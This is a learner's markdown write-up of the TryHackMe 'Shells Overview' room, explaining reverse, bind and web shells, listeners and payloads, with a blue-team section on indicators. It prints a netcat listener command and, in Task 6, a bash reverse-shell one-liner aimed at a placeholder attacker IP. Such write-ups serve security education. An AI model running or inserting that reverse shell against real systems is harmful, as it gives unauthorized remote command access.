# 🐚 Shells Overview — TryHackMe Room

<p align="center">
  <img src="https://github.com/Grishank/cybersecurity-roadmap-tryhackme/blob/main/assets/images/Shells-Overview-banner.png?raw=true" alt="Shells Overview Banner" width="900"/>
</p>

---

**Platform:** TryHackMe  
**Path:** Cybersecurity 101  
**Module:** Offensive Security Tooling  
**Difficulty:** Easy  
**Date Completed:** May 2026  
**Room Link:** https://tryhackme.com/room/shellsoverview  
**Status:** ✔ Completed  

---

# 🧠 Room Overview

The **Shells Overview** room introduced the fundamentals of:
- Reverse shells
- Bind shells
- Web shells
- Payloads
- Shell listeners

The room focused on understanding how attackers gain remote command execution and maintain access during exploitation.

This knowledge is critical for:
- Offensive security
- Incident response
- SOC investigations
- Threat hunting

---

# 🎯 Learning Objectives

- Understand different shell types
- Learn reverse shell concepts
- Understand bind shell communication
- Learn shell listener basics
- Understand payloads
- Explore web shells
- Recognize shell-related attack behavior

---

# 🖥️ Task 2 — Shell Overview

A shell provides command execution access on a target system.

## Common Shell Types

| Shell Type | Description |
|---|---|
| Reverse Shell | Target connects back to attacker |
| Bind Shell | Target opens listening port |
| Web Shell | Web-based command execution |

---

# 🔄 Task 3 — Reverse Shell

A reverse shell works by:
1. Victim initiates outbound connection
2. Attacker receives the connection
3. Remote command execution becomes possible

## Why Reverse Shells Are Popular

- Bypass inbound firewall rules
- Easier external connectivity
- Common in exploitation frameworks

## Example Listener

```bash
nc -lvnp 4444
```

---

# 🔗 Task 4 — Bind Shell

A bind shell opens a listening port on the victim machine.

The attacker then connects directly to the victim.

## Key Difference

| Reverse Shell | Bind Shell |
|---|---|
| Victim connects to attacker | Attacker connects to victim |

## Risks

- Easier to detect
- Requires exposed listening port
- Often blocked by firewalls

---

# 🎧 Task 5 — Shell Listeners

Listeners wait for incoming shell connections.

## Common Listener Tools

- Netcat
- Metasploit multi/handler
- Socat

## Netcat Example

```bash
nc -lvnp 4444
```

---

# 💣 Task 6 — Shell Payloads

Payloads are code snippets used to establish shells.

## Common Payload Types

- Bash payloads
- PowerShell payloads
- Python payloads
- PHP payloads

## Example Bash Reverse Shell

```bash
bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
```

---

# 🌐 Task 7 — Web Shell

A web shell allows command execution through a web application.

## Common Web Shell Languages

- PHP
- ASPX
- JSP

## Risks of Web Shells

- Persistent access
- Remote code execution
- File management abuse
- Credential theft

---

# 🧪 Task 8 — Practical Task

The room included practical interaction with:
- Shell listeners
- Reverse shells
- Payload execution
- Remote command access

## Skills Practiced

- Handling shell connections
- Understanding payload behavior
- Identifying shell communication
- Remote command execution concepts

---

# 🛡️ SOC / Blue Team Perspective

SOC analysts should monitor for:
- Suspicious outbound connections
- Unusual listening ports
- Encoded PowerShell commands
- Netcat usage
- Web shell uploads

## Common Indicators of Compromise (IoCs)

- Unexpected external connections
- Abnormal parent-child processes
- Suspicious scripting activity
- Web server anomalies

---

# 🧾 Key Concepts Learned

- Reverse shells
- Bind shells
- Web shells
- Payloads
- Shell listeners
- Remote command execution
- Shell communication workflows

---

# 💬 Key Takeaway

> “Understanding shells is critical because many real-world attacks rely on remote command execution for persistence, privilege escalation, and lateral movement.”

---

# 🚀 Next Steps

- Practice Netcat usage
- Learn Socat basics
- Explore shell stabilization
- Study web shell detection
- Continue offensive tooling rooms
